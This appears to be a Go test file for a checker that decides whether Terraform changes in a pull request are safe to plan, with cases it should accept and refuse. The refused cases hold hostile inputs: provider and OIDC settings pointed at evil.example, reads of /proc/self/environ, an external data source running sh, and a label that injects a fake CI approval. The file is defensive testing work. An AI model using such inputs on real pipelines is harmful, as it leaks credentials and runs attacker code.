package main

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// A compute tier shaped like caersid's.
var baseFiles = map[string]string{
	"compute/versions.tf": `terraform {
  required_version = ">= 1.14.0, < 2.0.0"
  required_providers {
    azurerm = {
      source  = "hashicorp/azurerm"
      version = "~> 5.12.0"
    }
  }
}

provider "azurerm" {
  subscription_id = local.subscription_id
  features {}
}
`,
	"compute/backend.tf": "terraform {\n  backend \"azurerm\" {}\n}\n",
	"compute/main.tf": `data "terraform_remote_state" "platform" {
  backend = "azurerm"
  config = {
    key              = "caersid/platform-production.tfstate"
    use_azuread_auth = true
  }
}

locals {
  platform = data.terraform_remote_state.platform.outputs
}
`,
	"compute/storage.tf": `# Static site storage.
resource "azurerm_storage_account" "this" {
  name = "st"
}

data "azurerm_client_config" "current" {}

resource "azurerm_storage_blob" "serve" {
  name   = "serve.json"
  source = "${path.module}/files/serve.json"
}

resource "azurerm_storage_container" "web" {
  count = local.containers
  name  = "web"
}

resource "azurerm_role_assignment" "reader" {
  scope        = azurerm_storage_account.this.id
  principal_id = data.azurerm_client_config.current.object_id
}

locals {
  containers = 1
}
`,
	"compute/variables.tf":                   "variable \"subscription_id\" {\n  type    = string\n  default = \"sub\"\n}\n\nlocals {\n  subscription_id = var.subscription_id\n}\n",
	"compute/files/serve.json":               "{}\n",
	"compute/.terraform.lock.hcl":            "provider \"registry.terraform.io/hashicorp/azurerm\" {\n  version = \"5.12.0\"\n}\n",
	"compute/backend-production.hcl":         "key = \"caersid/compute-production.tfstate\"\n",
	"environments/compute-production.tfvars": "subscription_id = \"x\"\n",
}

func write(t *testing.T, root string, files map[string]string) {
	t.Helper()
	for p, c := range files {
		full := filepath.Join(root, p)
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(c), 0o644); err != nil {
			t.Fatal(err)
		}
	}
}

// run builds base and head trees, lets mutate change the head, and checks.
func run(t *testing.T, mutate func(head string)) (string, error) {
	t.Helper()
	dir := t.TempDir()
	base, head := filepath.Join(dir, "base"), filepath.Join(dir, "head")
	write(t, base, baseFiles)
	write(t, head, baseFiles)
	if mutate != nil {
		mutate(head)
	}
	return check("compute", head, base)
}

func appendTo(t *testing.T, head, p, s string) {
	t.Helper()
	f, err := os.OpenFile(filepath.Join(head, p), os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0o644)
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	if _, err := f.WriteString(s); err != nil {
		t.Fatal(err)
	}
}

func replaceIn(t *testing.T, head, p, old, new string) {
	t.Helper()
	b, err := os.ReadFile(filepath.Join(head, p))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(b), old) {
		t.Fatalf("%s does not contain %q", p, old)
	}
	if err := os.WriteFile(filepath.Join(head, p), []byte(strings.Replace(string(b), old, new, 1)), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestPlanned(t *testing.T) {
	cases := map[string]func(t *testing.T, head string){
		"unchanged": func(t *testing.T, head string) {},
		"a new resource": func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\nresource \"azurerm_storage_container\" \"c\" {\n  name = \"c\"\n}\n")
		},
		"a resource ID with /providers/ and a role assignment": func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\nresource \"azurerm_role_assignment\" \"r\" {\n  scope              = \"/subscriptions/x/providers/Microsoft.Storage/storageAccounts/st\"\n  role_definition_id = \"/providers/Microsoft.Authorization/roleDefinitions/abc\"\n  principal_id       = data.azurerm_client_config.current.object_id\n}\n")
		},
		"comments naming provider, backend and module": func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\n# The backend and provider live elsewhere; no module here.\n/* provider \"x\" {} */\n")
		},
		"a comment inside versions.tf": func(t *testing.T, head string) {
			replaceIn(t, head, "compute/versions.tf", "features {}", "features {} # unchanged")
		},
		"the provider block moved to another file": func(t *testing.T, head string) {
			b, _ := os.ReadFile(filepath.Join(head, "compute/versions.tf"))
			i := strings.Index(string(b), "provider \"azurerm\"")
			os.WriteFile(filepath.Join(head, "compute/versions.tf"), b[:i], 0o644)
			os.WriteFile(filepath.Join(head, "compute/providers.tf"), b[i:], 0o644)
		},
		"a literal count and for_each": func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\nresource \"azurerm_storage_container\" \"n\" {\n  count = 2\n  name  = \"n\"\n}\nresource \"azurerm_storage_container\" \"m\" {\n  for_each = toset([\"a\", \"b\"])\n  name     = each.key\n}\n")
		},
		"a data source of a type main uses": func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\ndata \"azurerm_client_config\" \"again\" {}\n")
		},
		"an output and a local that use data": func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\nlocals {\n  rg = local.platform.resource_group_name\n}\noutput \"e\" {\n  value = azurerm_storage_account.this.primary_web_endpoint\n}\n")
		},
		"a payload file changes when nothing reads files": func(t *testing.T, head string) {
			write(t, head, map[string]string{"compute/files/serve.json": "{\"v\": 2}\n"})
		},
		"an unchanged count fed by an unchanged local": func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\n# a comment only\n")
		},
		"a variable unrelated to the provider changes": func(t *testing.T, head string) {
			appendTo(t, head, "compute/variables.tf", "\nvariable \"other\" {\n  default = \"x\"\n}\n")
		},
	}
	for name, mutate := range cases {
		t.Run(name, func(t *testing.T) {
			msg, err := run(t, func(head string) { mutate(t, head) })
			if err != nil || !strings.HasPrefix(msg, "ok:") {
				t.Fatalf("want ok, got %q, %v", msg, err)
			}
		})
	}
}

func TestRefused(t *testing.T) {
	cases := []struct {
		name   string
		want   string
		mutate func(t *testing.T, head string)
	}{
		{"metadata_host in the provider", "provider or remote-state configuration differs", func(t *testing.T, head string) {
			replaceIn(t, head, "compute/versions.tf", "features {}", "features {}\n  metadata_host = \"evil.example\"")
		}},
		{"a second, aliased provider", "configuration differs", func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\n/**/ provider \"azurerm\" {\n  alias = \"x\"\n  features {}\n}\n")
		}},
		{"a backend change", "configuration differs", func(t *testing.T, head string) {
			replaceIn(t, head, "compute/backend.tf", "azurerm", "http")
		}},
		{"backend.tf removed", "configuration differs", func(t *testing.T, head string) {
			os.Remove(filepath.Join(head, "compute/backend.tf"))
		}},
		{"a built key in the remote-state config", "configuration differs", func(t *testing.T, head string) {
			replaceIn(t, head, "compute/main.tf", "use_azuread_auth = true", "use_azuread_auth = true\n    \"oidc${\"\"}_request_url\" = \"https://evil.example\"")
		}},
		{"a new remote state", "configuration differs", func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\ndata \"terraform_remote_state\" \"x\" {\n  backend = \"http\"\n  config  = { address = \"https://evil.example\" }\n}\n")
		}},
		{"the provider's variable default changes", "var.subscription_id, which the provider", func(t *testing.T, head string) {
			replaceIn(t, head, "compute/variables.tf", "\"sub\"", "\"other\"")
		}},
		{"the provider's local changes", "local.subscription_id, which the provider", func(t *testing.T, head string) {
			replaceIn(t, head, "compute/variables.tf", "subscription_id = var.subscription_id", "subscription_id = \"other\"")
		}},
		{"a module block after an inline comment", "module block", func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\n/**/ module \"m\" { source = \"./m\" }\n")
		}},
		{"a bare-label module", "module block", func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\nmodule x {\n  source = \"./m\"\n}\n")
		}},
		{"a block comment closed by a # line", "module block", func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\n/*\n# */ module \"m\" { source = \"./m\" }\n")
		}},
		{"configuration in a subdirectory", "a subdirectory of the tier", func(t *testing.T, head string) {
			write(t, head, map[string]string{"compute/m/main.tf": "data \"external\" \"x\" {}\n"})
		}},
		{"a newline in a file name", "whose name is not", func(t *testing.T, head string) {
			write(t, head, map[string]string{"compute/x\ny.tf": "provider \"azurerm\" {}\n"})
		}},
		{"a name starting with ..", "whose name is not", func(t *testing.T, head string) {
			write(t, head, map[string]string{"compute/..x.auto.tfvars": "a = 1\n"})
		}},
		{"a symbolic link", "symbolic link", func(t *testing.T, head string) {
			os.Symlink("../environments/compute-production.tfvars", filepath.Join(head, "compute/link.tf"))
		}},
		{"a symbolic link tfvars", "tfvars file differs", func(t *testing.T, head string) {
			p := filepath.Join(head, "environments/compute-production.tfvars")
			os.Remove(p)
			os.Symlink("/etc/hosts", p)
		}},
		{"tfvars changed", "tfvars file differs", func(t *testing.T, head string) {
			write(t, head, map[string]string{"environments/compute-production.tfvars": "subscription_id = \"y\"\n"})
		}},
		{"an auto.tfvars file", "x.auto.tfvars differs", func(t *testing.T, head string) {
			write(t, head, map[string]string{"compute/x.auto.tfvars": "a = 1\n"})
		}},
		{"a terraform.tfvars file", "terraform.tfvars differs", func(t *testing.T, head string) {
			write(t, head, map[string]string{"compute/terraform.tfvars": "a = 1\n"})
		}},
		{"the lock file changed", ".terraform.lock.hcl differs", func(t *testing.T, head string) {
			appendTo(t, head, "compute/.terraform.lock.hcl", "\n")
		}},
		{"terraform.d", "terraform.d directory", func(t *testing.T, head string) {
			os.MkdirAll(filepath.Join(head, "compute/terraform.d/plugins"), 0o755)
		}},
		{".terraform", ".terraform directory", func(t *testing.T, head string) {
			os.MkdirAll(filepath.Join(head, "compute/.terraform/providers"), 0o755)
		}},
		{".tf.json", "JSON and .tofu", func(t *testing.T, head string) {
			write(t, head, map[string]string{"compute/x.tf.json": "{}\n"})
		}},
		{"an override file", "override file", func(t *testing.T, head string) {
			write(t, head, map[string]string{"compute/storage_override.tf": "resource \"x\" \"y\" {}\n"})
		}},
		{"file() in a changed resource", "calls file()", func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\nresource \"azurerm_storage_container\" \"c\" {\n  name = file(\"/proc/self/environ\")\n}\n")
		}},
		{"templatefile() in a changed local", "calls templatefile()", func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\nlocals {\n  t = templatefile(\"x\", {})\n}\n")
		}},
		{"a provider-defined function", "provider-defined function", func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\noutput \"p\" {\n  value = provider::azurerm::normalise_resource_id(\"x\")\n}\n")
		}},
		{"an external data source", "external data source", func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\ndata \"external\" \"x\" {\n  program = [\"sh\"]\n}\n")
		}},
		{"a key vault encrypted value", "azurerm_key_vault_encrypted_value data source", func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\ndata \"azurerm_key_vault_encrypted_value\" \"x\" {\n  key_vault_key_id = \"https://evil.example/keys/k/1\"\n  algorithm        = \"RSA-OAEP\"\n  plain_text_value = \"x\"\n}\n")
		}},
		{"a data source type main does not use", "a type main does not use", func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\ndata \"azurerm_key_vault_secret\" \"x\" {\n  name = \"s\"\n}\n")
		}},
		{"a data source in a check block", "check block", func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\ncheck \"c\" {\n  data \"external\" \"x\" {}\n  assert {\n    condition     = true\n    error_message = \"x\"\n  }\n}\n")
		}},
		{"an ephemeral resource", "ephemeral resource", func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\nephemeral \"azurerm_key_vault_secret\" \"x\" {\n  name = \"s\"\n}\n")
		}},
		{"a count from a value", "count that references", func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\nresource \"azurerm_storage_container\" \"c\" {\n  count = length(local.platform)\n  name  = \"c\"\n}\n")
		}},
		{"a for_each from data", "for_each that references", func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\nresource \"azurerm_storage_container\" \"c\" {\n  for_each = toset([data.azurerm_client_config.current.tenant_id])\n  name     = each.key\n}\n")
		}},
		{"a changed resource gains a count from a value", "count that references", func(t *testing.T, head string) {
			replaceIn(t, head, "compute/storage.tf", "name = \"st\"", "name  = \"st\"\n  count = length(var.other)")
		}},
		{"an unchanged count fed by a changed local", "count that references", func(t *testing.T, head string) {
			replaceIn(t, head, "compute/storage.tf", "containers = 1", "containers = length(azurerm_storage_account.this.primary_access_key)")
		}},
		{"a new resource type", "a type main does not use", func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\nresource \"azurerm_key_vault\" \"k\" {\n  name = \"k\"\n}\n")
		}},
		{"an import block", "import block", func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\nimport {\n  to = azurerm_storage_account.this\n  id = \"x\"\n}\n")
		}},
		{"a moved block", "moved block", func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\nmoved {\n  from = azurerm_storage_account.old\n  to   = azurerm_storage_account.this\n}\n")
		}},
		{"a removed block", "removed block", func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\nremoved {\n  from = azurerm_storage_account.old\n}\n")
		}},
		{"a check block", "check block", func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\ncheck \"c\" {\n  assert {\n    condition     = azurerm_storage_account.this.name == \"st\"\n    error_message = \"x\"\n  }\n}\n")
		}},
		{"a precondition in a changed resource", "precondition", func(t *testing.T, head string) {
			replaceIn(t, head, "compute/storage.tf", "name = \"st\"", "name = \"st\"\n  lifecycle {\n    precondition {\n      condition     = true\n      error_message = \"x\"\n    }\n  }")
		}},
		{"a postcondition in a new output", "postcondition", func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\noutput \"o\" {\n  value = 1\n  postcondition {\n    condition     = true\n    error_message = \"x\"\n  }\n}\n")
		}},
		{"a label that is not an identifier", "not an identifier", func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\ndata \"x\\n::error title=Plan::approved\" \"y\" {}\n")
		}},
		{"a test file", "test, mock or query file", func(t *testing.T, head string) {
			write(t, head, map[string]string{"compute/a.tftest.hcl": "run \"a\" {}\n"})
		}},
		{"a tests directory", "tests directory", func(t *testing.T, head string) {
			write(t, head, map[string]string{"compute/tests/readme.md": "x\n"})
		}},
		{"dot-named configuration", "dot-named configuration", func(t *testing.T, head string) {
			write(t, head, map[string]string{"compute/.x.tf": "locals {}\n"})
		}},
		{"a resource fed by a tainted local", "a type main does not use", func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\nlocals {\n  n = \"x\"\n}\nresource \"azurerm_key_vault\" \"k\" {\n  name = local.n\n}\n")
		}},
		{"an attribute at the top level", "attribute at the top level", func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\nx = 1\n")
		}},
		{"an unknown block type", "action block", func(t *testing.T, head string) {
			appendTo(t, head, "compute/storage.tf", "\naction \"x\" \"y\" {}\n")
		}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			msg, err := run(t, func(head string) { c.mutate(t, head) })
			var r refusal
			if !errors.As(err, &r) {
				t.Fatalf("want a refusal containing %q, got %q, %v", c.want, msg, err)
			}
			if !strings.Contains(r.msg, c.want) {
				t.Fatalf("want a refusal containing %q, got %q", c.want, r.msg)
			}
		})
	}
}

func TestErrors(t *testing.T) {
	if _, err := check("identity", t.TempDir(), t.TempDir()); err == nil {
		t.Fatal("an unknown tier must be an error")
	}
	dir := t.TempDir()
	write(t, filepath.Join(dir, "head"), baseFiles)
	if _, err := check("compute", filepath.Join(dir, "head"), filepath.Join(dir, "nobase")); err == nil {
		t.Fatal("a missing base must be an error")
	}
}

// When main's configuration reads files, every other file is frozen.
func TestTemplatesFrozen(t *testing.T) {
	dir := t.TempDir()
	base, head := filepath.Join(dir, "base"), filepath.Join(dir, "head")
	files := map[string]string{}
	for k, v := range baseFiles {
		files[k] = v
	}
	files["compute/templates.tf"] = "locals {\n  page = templatefile(\"${path.module}/files/page.tftpl\", {})\n}\n"
	files["compute/files/page.tftpl"] = "hello\n"
	write(t, base, files)
	write(t, head, files)
	if msg, err := check("compute", head, base); err != nil {
		t.Fatalf("unchanged: want ok, got %q, %v", msg, err)
	}
	write(t, head, map[string]string{"compute/files/page.tftpl": "${file(\"/proc/self/environ\")}\n"})
	_, err := check("compute", head, base)
	var r refusal
	if !errors.As(err, &r) || !strings.Contains(r.msg, "files/page.tftpl differs") {
		t.Fatalf("a changed template: want a refusal, got %v", err)
	}
}
